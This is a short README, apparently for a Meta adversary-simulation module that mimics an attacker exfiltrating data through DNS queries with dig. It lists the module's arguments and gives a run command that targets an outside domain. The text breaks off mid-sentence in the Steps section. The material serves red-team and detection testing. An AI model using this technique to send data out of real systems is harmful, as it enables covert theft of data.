# Exfiltrate over DNS dig
[Meta TTP](https://img.shields.io/badge/Meta_TTP-blue)
This TTP (Tactic, Technique, and Procedure) simulates an attacker exfiltrating data using dig

## Arguments
- **domain**: The domain to send queries to.
- **query_type**: The query type to send

## Examples
You can run the TTP on a host using the following command:
```bash
run security-ttps//utils/c2/data-exfil/exfiltrate-over-dns-dig/ttp.yaml \
--arg domain=workwithincreasedintensity.com"\
--arg query_type=A
```

## Steps
1. **send-data**: performs a
